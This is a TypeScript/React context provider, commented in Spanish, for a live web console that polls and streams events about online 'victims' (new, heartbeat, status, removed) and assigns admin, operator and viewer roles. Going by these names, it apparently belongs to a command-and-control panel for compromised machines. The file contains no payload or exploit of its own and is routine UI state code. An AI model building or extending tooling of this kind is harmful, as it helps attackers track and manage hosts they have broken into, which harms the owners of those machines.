'use client';
import { createContext, useCallback, useContext, useEffect, useMemo, useRef, useState } from 'react';
import { toast } from 'sonner';
import { useLive, type LiveEvent, type LiveStatus } from '@/hooks/useLive';
import type { Operator } from '@/lib/types';

type LiveContext = {
  events: LiveEvent[];
  connected: boolean;
  status: LiveStatus;
  lastEventAt: number | null;
  reconnect: () => void;
  online: number;
  onlineIds: Set<string>;
  refreshOnline: () => void;
  role: 'admin' | 'operator' | 'viewer';
};

const Context = createContext<LiveContext | null>(null);

export function LiveProvider({ children, role }: { children: React.ReactNode; role: 'admin' | 'operator' | 'viewer' }) {
  const [events, setEvents] = useState<LiveEvent[]>([]);
  const [status, setStatus] = useState<LiveStatus>('connecting');
  const [lastEventAt, setLastEventAt] = useState<number | null>(null);
  const [onlineIds, setOnlineIds] = useState<Set<string>>(new Set());
  const [token, setToken] = useState(0);
  const redirected = useRef(false);
  const refreshTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
  const pending = useRef<LiveEvent[]>([]);
  const flushTimer = useRef<ReturnType<typeof setTimeout> | null>(null);

  const refreshOnline = useCallback(() => {
    if (refreshTimer.current) return;
    refreshTimer.current = setTimeout(() => {
      refreshTimer.current = null;
      void fetch('/api/console/victims?status=online&limit=200', { credentials: 'same-origin' })
        .then((response) => response.ok ? response.json() as Promise<{ items: Array<{ id: string; online?: boolean }> }> : null)
        .then((data) => {
          if (data) setOnlineIds(new Set(data.items.filter((item) => item.online).map((item) => item.id)));
        })
        .catch(() => undefined);
    }, 250);
  }, []);

  /* El stream puede llegar a ráfagas: se agrupa en un frame antes de tocar estado. */
  const flush = useCallback(() => {
    flushTimer.current = null;
    const batch = pending.current;
    pending.current = [];
    if (batch.length === 0) return;
    setLastEventAt(batch[batch.length - 1].at);
    setEvents((current) => [...batch].reverse().concat(current).slice(0, 250));
    setOnlineIds((current) => {
      const next = new Set(current);
      for (const event of batch) {
        if (!event.victimId) continue;
        if (event.type === 'victim.removed') { next.delete(event.victimId); continue; }
        if (!['victim.heartbeat', 'victim.new', 'victim.status'].includes(event.type)) continue;
        const value = String(event.data.status ?? (event.type === 'victim.new' ? 'online' : ''));
        if (value === 'online') next.add(event.victimId);
        else if (['stale', 'offline', 'revoked'].includes(value)) next.delete(event.victimId);
      }
      return next;
    });
  }, []);

  useEffect(() => () => { if (flushTimer.current) clearTimeout(flushTimer.current); }, []);

  useEffect(() => {
    refreshOnline();
    const timer = setInterval(refreshOnline, 60_000);
    return () => {
      clearInterval(timer);
      if (refreshTimer.current) clearTimeout(refreshTimer.current);
    };
  }, [refreshOnline]);

  useLive(
    (event) => {
      pending.current.push(event);
      if (!flushTimer.current) flushTimer.current = setTimeout(flush, 90);
      if (event.type === 'victim.new') refreshOnline();
    },
    {
      toast: true,
      onStatus: setStatus,
      onUnauthorized: () => {
        if (redirected.current) return;
        redirected.current = true;
        toast.error('Sesión caducada', { description: 'Vuelve a entrar para retomar el stream.' });
        const next = encodeURIComponent(`${location.pathname}${location.search}`);
        location.assign(`/login?expired=1&next=${next}`);
      }
    },
    token
  );

  const reconnect = useCallback(() => {
    setStatus('connecting');
    setToken((value) => value + 1);
  }, []);

  const value = useMemo(
    () => ({ events, connected: status === 'open', status, lastEventAt, reconnect, online: onlineIds.size, onlineIds, refreshOnline, role }),
    [events, status, lastEventAt, reconnect, onlineIds, refreshOnline, role]
  );
  return <Context.Provider value={value}>{children}</Context.Provider>;
}

export function useLiveContext(): LiveContext {
  const context = useContext(Context);
  if (!context) throw new Error('useLiveContext outside LiveProvider');
  return context;
}

export type Session = Operator;

export function useRole() {
  return useLiveContext().role;
}

export function useCanWrite() {
  return useLiveContext().role !== 'viewer';
}
